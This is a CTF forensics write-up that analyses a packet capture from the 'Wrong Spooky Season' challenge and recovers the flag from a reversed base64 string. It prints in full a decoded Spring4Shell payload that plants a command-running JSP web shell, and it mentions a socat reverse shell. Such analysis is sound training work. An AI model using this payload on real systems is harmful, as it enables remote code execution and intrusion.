# Wrong Spooky Season

## Background

> "I told them it was too soon and in the wrong season to deploy such a website, but they assured me that theming it properly would be enough to stop the ghosts from haunting us. I was wrong." Now there is an internal breach in the `Spooky Network` and you need to find out what happened. Analyze the the network traffic and find how the scary ghosts got in and what they did.

> Difficulty: Easy

- Overall difficulty for me: Very easy

## Find the flag

**In this challenge, we can [download a file](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/Wrong-Spooky-Season/forensics_wrong_spooky_season.zip)!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/Wrong-Spooky-Season/images/a1.png)

```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/Wrong-Spooky-Season]
└─# unzip forensics_wrong_spooky_season.zip 
Archive:  forensics_wrong_spooky_season.zip
  inflating: capture.pcap

┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/Wrong-Spooky-Season]
└─# file capture.pcap     
capture.pcap: pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)
```

**It's a `pcap` file! Let's open it in WireShark!**
```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/Wrong-Spooky-Season]
└─# wireshark capture.pcap
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/Wrong-Spooky-Season/images/a2.png)

**That's a lot of HTTP packets! Let's filter HTTP all requests!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/Wrong-Spooky-Season/images/a3.png)

**The attacker (`192.168.1.180`) looks like has sent a POST request, which uploaded a JSP reverse shell on the web server!**

**In the second POST request, I see this:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/Wrong-Spooky-Season/images/a4.png)

**Let's URL decode that in CyberChef:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/Wrong-Spooky-Season/images/a5.png)

```java
class.module.classLoader.resources.context.parent.pipeline.first.pattern=%{prefix}i java.io.InputStream in = %{c}i.getRuntime().exec(request.getParameter("cmd")).getInputStream(); int a = -1; byte[] b = new byte[2048]; while((a=in.read(b))!=-1){ out.println(new String(b)); } %{suffix}i&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&class.module.classLoader.resources.context.parent.pipeline.first.prefix=e4d1c32a56ca15b3&class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat=
```

**After some googling, this is a Spring4Shell payload!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/Wrong-Spooky-Season/images/a6.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/Wrong-Spooky-Season/images/a7.png)

**In the last HTTP GET request, we can see that the threat actor is installing `socat` in the victim system, and use that as a reverse shell!**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/Wrong-Spooky-Season/images/a8.png)

**Now, we can go to the last TCP stream to see what the threat actor did:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/Wrong-Spooky-Season/images/a9.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/HackTheBoo/Forensics/Wrong-Spooky-Season/images/a10.png)

**That reversed `base64` string looks sussy! Let's decode that:**
```
┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/Wrong-Spooky-Season]
└─# echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev
SFRCe2o0djRfNXByMW5nX2p1c3RfYjNjNG0zX2o0djRfc3AwMGt5ISF9Cg==

┌──(root🌸siunam)-[~/ctf/HackTheBoo/Forensics/Wrong-Spooky-Season]
└─# echo "==gC9FSI5tGMwA3cfRjd0o2Xz0GNjNjYfR3c1p2Xn5WMyBXNfRjd0o2eCRFS" | rev | base64 -d
HTB{j4v4_5pr1ng_just_b3c4m3_j4v4_sp00ky!!}
```

Found the flag!

# Conclusion

What we've learned:

1. Inspecting `pcap` File via WireShark